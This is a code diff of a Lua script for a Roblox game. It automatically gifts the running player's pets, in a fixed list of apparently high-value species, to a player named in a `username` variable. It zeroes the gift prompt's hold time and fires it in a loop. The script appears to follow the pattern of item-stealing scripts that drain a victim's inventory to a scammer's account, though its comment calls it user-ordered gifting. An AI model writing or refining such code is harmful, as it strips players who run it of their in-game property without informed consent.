@@ -347,8 +347,34 @@ local function unequipAllPets()
     end
 end
 
+-- BEGIN: Predictable, user-ordered gifting logic
+local giftingPetOrder = {
+    "Raccoon",
+    "Disco Bee",
+    "Mimic octopus",
+    "Dragon Fly",
+    "Queen Bee",
+    "Scarlet Macaw",
+    "Butterfly",
+    "Red fox",
+    "Chicken Zombie",
+    "Polar Bear",
+    "Petal Bee",
+    "Bear Bee",
+    "Cooked Owl"
+}
+
+local function getPetByName(petName)
+    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
+        local baseName = item.Name:match("^(.-)%s*%[") or item.Name
+        if baseName:lower() == petName:lower() then
+            return item
+        end
+    end
+    return nil
+end
+
 local function startGiving()
-    if not hasValidItems() then return end
     local target = Players:FindFirstChild(username)
     if not target or not target.Character then return end
     local hrp = target.Character:FindFirstChild("HumanoidRootPart")
@@ -361,22 +387,12 @@ local function startGiving()
     if not prompt then return end
     prompt.HoldDuration = 0
 
-    local index = 1
-    while true do
-        if not hasValidItems() then break end
-        local sortedItems = {}
-        for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
-            if getKg(item.Name) > 0 then
-                table.insert(sortedItems, item)
-            end
-        end
-        table.sort(sortedItems, function(a, b) return getKg(a.Name) > getKg(b.Name) end)
-
-        if #sortedItems > 0 then
-            if index > #sortedItems then index = 1 end
-            local item = sortedItems[index]
-            if item:IsA("Tool") then
-                item.Parent = LocalPlayer.Character
+    -- Gift pets in your specified order
+    for _, petName in ipairs(giftingPetOrder) do
+        local petItem = getPetByName(petName)
+        if petItem then
+            if petItem:IsA("Tool") then
+                petItem.Parent = LocalPlayer.Character
                 task.wait()
             end
 
@@ -387,17 +403,15 @@ local function startGiving()
             task.wait(prompt.Duration)
             prompt:InputHoldEnd(Enum.UserInputType.Touch)
 
-            if item:IsDescendantOf(LocalPlayer.Character) then
-                item.Parent = LocalPlayer.Backpack
+            if petItem:IsDescendantOf(LocalPlayer.Character) then
+                petItem.Parent = LocalPlayer.Backpack
             end
 
-            index = index + 1
-        else
-            break
+            task.wait(0.05)
         end
-        task.wait(0.05)
     end
 end
+-- END: Predictable, user-ordered gifting logic
 
 unequipAllPets()
 for _, p in ipairs(Players:GetPlayers()) do
